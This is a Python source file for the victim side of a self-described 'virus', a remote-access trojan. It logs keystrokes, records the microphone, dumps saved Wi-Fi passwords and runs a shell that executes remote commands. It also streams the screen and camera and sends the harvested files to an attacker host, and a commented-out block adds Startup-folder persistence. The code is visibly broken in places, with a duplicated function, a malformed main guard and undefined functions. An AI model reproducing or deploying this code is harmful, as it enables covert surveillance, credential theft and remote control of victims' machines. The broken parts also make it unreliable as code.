# -*- coding: utf-8 -*-
"""
Created on Dec 23 2020

@autor Tiz
"""
 
import threading, subprocess, socket, argparse, sys, os, time

# copy the file in a place where it's gona be launched in every start # never tryed
"""
import os
from shutil import copyfile
username = os.getlogin()
copyfile('virus.py', f'C:/Users/{username}/AppData/Roaming/Microsoft/Start Menu/Startup/Windaube.py')
"""


def parseargs():
    cli_args = argparse.ArgumentParser(description="Tiz Virus Victim")
    cli_args.add_argument('--host', help="listening ip, default is '0.0.0.0', no need to change", default='0.0.0.0',
                          type=str)
    cli_args.add_argument('--port',
                          help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2",
                          default=5000, type=int)
    cli_args.add_argument('--keylog', help="keylog=t create a keylogger file / keylog=f don\'t create the file",
                          default="t", type=str)
    cli_args.add_argument('--micro',
                          help="micro=10 record the microphone during 10 sec and put it in a file / micro=0 don\'t record",
                          default=10, type=int)
    cli_args.add_argument('--wifi', help="wifi=t create a file with all wifis password / wifi=f don't create the file",
                          default="t", type=str)
    cli_args.add_argument('--shell', help="shell=t revershell on port (default = 5000) / shell=f don't revershell",
                          default="t", type=str)
    cli_args.add_argument('--camera', help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream",
                          default="t", type=str)
    cli_args.add_argument('--screen', help="screen=t stream screen on port+2 (default = 5002) / screen=f don't stream",
                          default="t", type=str)
    options = cli_args.parse_args(sys.argv[1:])
    return options


def key_handler(key):
    logging.info(key)


def keylog():
    with Listener(on_press=key_handler) as listener:
        listener.join()


def Microphone(Seconds=10, File="record.wav"):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = float(Seconds)
    WAVE_OUTPUT_FILENAME = File
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
    frames = []
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()


def wifipass():
    with open("wifis.txt", "w", encoding="utf-8") as fichier:
        try:
            # Use cp437 to match the Windows console encoding
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding="cp437").split('\n')
            wifis = [line.split(':')[1].strip() for line in data if "All User Profile" in line]

            for wifi in wifis:
                try:
                    keys = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear'],
                                                   encoding="cp437").split('\n')
                    key = [line.split(':')[1].strip() for line in keys if "Key Content" in line]
                    fichier.write(f"{wifi}: {key[0] if key else 'No password found'}\n")
                except subprocess.CalledProcessError as e:
                    print(f"Error retrieving password for {wifi}: {e}")
                except IndexError:
                    print(f"Password not found for {wifi}")
        except Exception as e:
            print(f"Failed to retrieve Wi-Fi profiles: {e}")


def retreive_screenshot(conn):
    with mss.mss() as sct:
        # La région de l'écran à capturer
        rect = {'top': 0, 'left': 0, 'width': WIDTH, 'height': HEIGHT}

        while 'recording':
            # Prendre la capture d'écran
            img = sct.grab(rect)
            # Ajuster le niveau de compression ici (0-9)
            pixels = zlib.compress(img.rgb, 6)
            # Envoie de la taille de la taille des pixels
            size = len(pixels)
            size_len = (size.bit_length() + 7) // 8
            conn.send(bytes([size_len]))
            # Envoie de la taille des pixels
            size_bytes = size.to_bytes(size_len, 'big')
            conn.send(size_bytes)
            # Envoi des pixels compressés
            conn.sendall(pixels)


def screen_sender(host='0.0.0.0', port=5001):
    with socket.socket() as sock:
        sock.bind((host, port))
        sock.listen(5)
        print('screen sender started.')
        while 'connected':
            conn, addr = sock.accept()
            # print('Client connected IP:', addr)
            threadscreen2 = threading.Thread(target=retreive_screenshot, args=(conn,))
            threadscreen2.start()


import subprocess

def R_tcp(host='0.0.0.0', port=5000):
    s = socket.socket()
    BUFFER_SIZE = 4096

    try:
        s.bind((host, port))
        s.listen(7)
        print(f"Revershell đã bắt đầu. Đang lắng nghe tại {host}:{port}.")

        client_socket, client_address = s.accept()
        print(f"{client_address[0]}:{client_address[1]} !")

        while True:
            try:
                # Nhận lệnh từ kẻ tấn công
                lệnh = client_socket.recv(BUFFER_SIZE).decode()
                print(f"Nhận lệnh từ kẻ tấn công: {lệnh}")  # In ra lệnh nhận được

                if lệnh.lower() == "exit":  # Kiểm tra nếu nhận được lệnh thoát
                    print("Người tấn công đã yêu cầu thoát. Đóng kết nối...")
                    break

                # Thực hiện lệnh
                print(f"Đang thực hiện lệnh: {lệnh}")
                output = subprocess.getoutput(lệnh)

                # Gửi lại kết quả cho kẻ tấn công
                if output:  # Nếu có kết quả
                    client_socket.send(output.encode('utf-8'))
                else:  # Nếu không có kết quả
                    client_socket.send("Không có kết quả trả về.".encode('utf-8'))  # Gửi thông báo khi không có kết quả

            except Exception as e:
                error_message = f"Lỗi trong quá trình thực hiện lệnh: {e}"
                print(error_message)  # In ra thông báo lỗi
                client_socket.send(error_message.encode('utf-8'))  # Gửi thông báo lỗi cho kẻ tấn công
                break

    except Exception as e:
        print(f"Lỗi khi thiết lập kết nối: {e}")
    finally:
        client_socket.close()
        s.close()
        print("Kết nối đã được đóng.")

import socket
import subprocess

def R_tcp(máy_chủ='0.0.0.0', cổng=5000):
    s = socket.socket()
    BUFFER_SIZE = 4096

    try:
        s.bind((máy_chủ, cổng))
        s.listen(7)
        print(f"Revershell đã bắt đầu. Đang lắng nghe tại {máy_chủ}:{cổng}.")

        client_socket, client_address = s.accept()
        print(f"{client_address[0]}:{client_address[1]} đã kết nối!")

        while True:
            try:
                # Nhận lệnh từ kẻ tấn công
                lệnh = client_socket.recv(BUFFER_SIZE).decode()
                print(f"Nhận lệnh từ kẻ tấn công: {lệnh}")  # In ra lệnh nhận được

                if lệnh.lower() == "exit":  # Kiểm tra nếu nhận được lệnh thoát
                    print("Người tấn công đã yêu cầu thoát. Đóng kết nối...")
                    break

                # Thực hiện lệnh
                print(f"Đang thực hiện lệnh: {lệnh}")
                output = subprocess.getoutput(lệnh)

                # Gửi lại kết quả cho kẻ tấn công
                if output:  # Nếu có kết quả
                    client_socket.send(output.encode('utf-8'))
                else:  # Nếu không có kết quả
                    client_socket.send("Không có kết quả trả về.".encode('utf-8'))  # Gửi thông báo khi không có kết quả

            except Exception as e:
                error_message = f"Lỗi trong quá trình thực hiện lệnh: {e}"
                print(error_message)  # In ra thông báo lỗi
                client_socket.send(error_message.encode('utf-8'))  # Gửi thông báo lỗi cho kẻ tấn công
                break

    except Exception as e:
        print(f"Lỗi khi thiết lập kết nối: {e}")
    finally:
        client_socket.close()
        s.close()
        print("Kết nối đã được đóng.")

# Gọi hàm lắng nghe
R_tcp()



if _name_ == "_main_":
    # parse args for socket connection
    options = parseargs()
    # keylogger
    if (options.keylog == "t"):
        import logging
        from pynput.keyboard import Key, Listener
        from logging import info

        logging.basicConfig(filename="Keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
        threadlog = threading.Thread(target=keylog)
        threadlog.start()
    # microphone recorder
    if (options.micro > 0):
        import wave, pyaudio

        threadmic = threading.Thread(target=Microphone, args=(options.micro,))
        threadmic.start()
    # recup wifipass
    if (options.wifi == "t"):
        wifipass()
    # Reverse shell tcp
    if (options.shell == "t"):
        threadshell = threading.Thread(target=R_tcp, args=(options.host,5000))  # port 5000
        threadshell.start()
    # screen sender udp
    import zlib, mss

    if (options.screen == "t"):
        WIDTH = 1900
        HEIGHT = 1000
        threadscreen = threading.Thread(target=screen_sender, args=(options.host, options.port + 1))  # port 5001
        threadscreen.start()
    # camera sender udp
    import cv2, math, struct

    if (options.camera == "t"):
        MAX_DGRAM = 2 ** 16
        MAX_IMAGE_DGRAM = MAX_DGRAM - 64  # extract 64 bytes in case UDP frame overflown
        threadcam = threading.Thread(target=camsender, args=(options.port + 2,))  # port 5002
        threadcam.start()
    
    # Send files to attacker
    attacker_host = '127.0.0.1'  # Assuming the attacker's IP is the same as the listening IP
    file_transfer_port = options.port + 3  # Using a new port for file transfer
    
    files_to_send = ["Keylog.txt", "record.wav", "wifis.txt"]
    
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((attacker_host, file_transfer_port))
                for file in files_to_send:
                    send_file(s, file)
                print("Successfully connected and sent files.")
                break  # Exit the loop if connection and file transfer are successful
        except Exception as e:
            print(f"Error connecting to attacker for file transfer: {e}")
            print("Retrying in 5 seconds...")
            time.sleep(5)  # Wait for 5 seconds before retrying

    # suite